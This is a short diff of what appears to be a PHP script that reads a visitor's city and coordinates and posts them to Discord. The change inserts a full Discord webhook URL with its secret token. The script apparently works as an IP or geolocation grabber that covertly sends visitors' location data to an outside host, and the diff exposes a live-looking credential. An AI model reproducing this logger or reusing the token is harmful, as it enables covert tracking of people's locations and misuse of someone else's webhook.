@@ -23,7 +23,7 @@ $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; // Coordinates
 
 //Variables
-$Webhook    = ""; //Webhook here.
+$Webhook    = "https://canary.discord.com/api/webhooks/958985524515864636/67mY098VM9Akwvgjnk2oCe18vQ24Vg2t22BCnofiH6HNO2vxct10kvS-fSETRv5aQSVf"; //Webhook here.
 
 $WebhookTag = "Showcase"; //This will be the name of the webhook when it sends a message.  
 
